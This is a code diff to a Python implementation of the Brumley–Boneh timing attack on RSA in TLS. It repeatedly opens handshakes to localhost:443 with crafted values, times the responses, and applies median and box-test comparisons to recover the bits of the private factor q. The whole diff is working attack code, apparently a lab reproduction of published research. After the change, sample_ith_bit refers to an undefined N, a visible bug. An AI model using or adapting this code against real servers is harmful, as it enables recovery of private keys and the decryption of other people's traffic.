@@ -91,25 +91,29 @@ def reverse_montegomery_transform(g, N):
     return u_g
 
 
-def sample(points, sample_size=7, u_g=False, N=None):
+def sample(points, sample_size=7, neighbourhood_size=400, u_g=False, N=None):
     samples = []
 
     gc.disable()
 
-    for point in points:
-        for iteration in range(sample_size):
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect(("localhost", 443))
+    for iteration in range(sample_size):
+        for point in points:
+            neighbourhood = [point + k for k in range(neighbourhood_size)]
+            for neighbour in neighbourhood:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect(("localhost", 443))
 
-            if u_g and N:
-                point_to_send = reverse_montegomery_transform(point, N)
-            else:
-                point_to_send = point
+                if u_g and N:
+                    value_to_send = reverse_montegomery_transform(neighbour, N)
+                else:
+                    value_to_send = neighbour
 
-            start_time, response, end_time = tls.handshake_attack(sock, g=point_to_send)
-            samples.append((point, end_time - start_time))
+                start_time, response, end_time = tls.handshake_attack(
+                    sock, g=value_to_send
+                )
+                samples.append((neighbour, end_time - start_time))
 
-            sock.close()
+                sock.close()
 
     gc.collect()
     gc.enable()
@@ -118,10 +122,7 @@ def sample(points, sample_size=7, u_g=False, N=None):
 
 
 def bruteforce_most_significant_bits(
-    num_bits=3,
-    min_point=sympy.sympify("2**511"),
-    max_point=sympy.sympify("2**512"),
-    neighbourhood_size=400,
+    num_bits=3, min_point=sympy.sympify("2**511"), max_point=sympy.sympify("2**512")
 ):
     msb = []
     for i in range(2 ** num_bits):
@@ -132,41 +133,74 @@ def bruteforce_most_significant_bits(
     gs = [bits + [0] * (512 - num_bits) for bits in msb]
     gs = [bits_to_sympy_integer(g) for g in gs]
 
-    # gs.append(p)
-    # gs.append(q)
-
     gs = [g for g in gs if min_point <= g <= max_point]
-
-    for g in gs.copy():
-        gs += [g + i for i in range(1, neighbourhood_size)]
 
     return gs
 
 
-def recover_bit(q_bits, i, N, sample_size=7, neighbourhood_size=400):
+def sample_ith_bit(q_bits, i, sample_size=7, neighbourhood_size=400):
     num_bits = len(q_bits)
 
     g_low_bits = q_bits[0:i] + [0] + [0] * (num_bits - (i + 1))
     g_low = bits_to_sympy_integer(g_low_bits)
-    g_low_neighbours = [g_low + k for k in range(neighbourhood_size)]
-
-    g_low_samples = sample(g_low_neighbours, sample_size=sample_size, u_g=True, N=N)
+    g_low_samples = sample(
+        [g_low],
+        sample_size=sample_size,
+        neighbourhood_size=neighbourhood_size,
+        u_g=True,
+        N=N,
+    )
     g_low_samples = pandas.DataFrame.from_records(
         g_low_samples, columns=["point", "time"]
     )
-    T_g_low = g_low_samples.groupby(by="point").median()["time"].sum()
 
     g_high_bits = q_bits[0:i] + [1] + [0] * (num_bits - (i + 1))
     g_high = bits_to_sympy_integer(g_high_bits)
-    g_high_neighbours = [g_high + k for k in range(neighbourhood_size)]
-
-    g_high_samples = sample(g_high_neighbours, sample_size=sample_size, u_g=True, N=N)
+    g_high_samples = sample(
+        [g_high],
+        sample_size=sample_size,
+        neighbourhood_size=neighbourhood_size,
+        u_g=True,
+        N=N,
+    )
     g_high_samples = pandas.DataFrame.from_records(
         g_high_samples, columns=["point", "time"]
     )
-    T_g_high = g_high_samples.groupby(by="point").median()["time"].sum()
 
+    return g_low_samples, g_high_samples
+
+
+def recover_bit_brumley_and_boneh(g_low_samples, g_high_samples):
+    T_g_low = g_low_samples.groupby(by="point").median()["time"].mean()
+    T_g_high = g_high_samples.groupby(by="point").median()["time"].mean()
     return T_g_low, T_g_high
+
+
+def box_test(x_samples, y_samples, i=1, j=5):
+    """
+    Ref: http://www.cs.rice.edu/~dwallach/pub/crosby-timing2009.pdf
+    """
+    x_start = x_samples.quantile(i / 100, interpolation="lower")
+    x_end = x_samples.quantile(j / 100, interpolation="lower")
+
+    y_start = y_samples.quantile(i / 100, interpolation="lower")
+    y_end = y_samples.quantile(j / 100, interpolation="lower")
+
+    print("{} <= {} <= {} <= {}".format(x_start, x_end, y_start, y_end))
+
+    no_overlap = (
+        x_start <= x_end <= y_start <= y_end or y_start <= y_end <= x_start <= x_end
+    )
+    if no_overlap:  # => these samples have different distributions
+        return False
+
+    else:  # => these samples follow the same distribution
+        return True
+
+
+def recover_bit_box_test(g_low_samples, g_high_samples):
+    have_same_distribution = box_test(g_low_samples["time"], g_high_samples["time"])
+    return have_same_distribution
 
 
 if __name__ == "__main__":
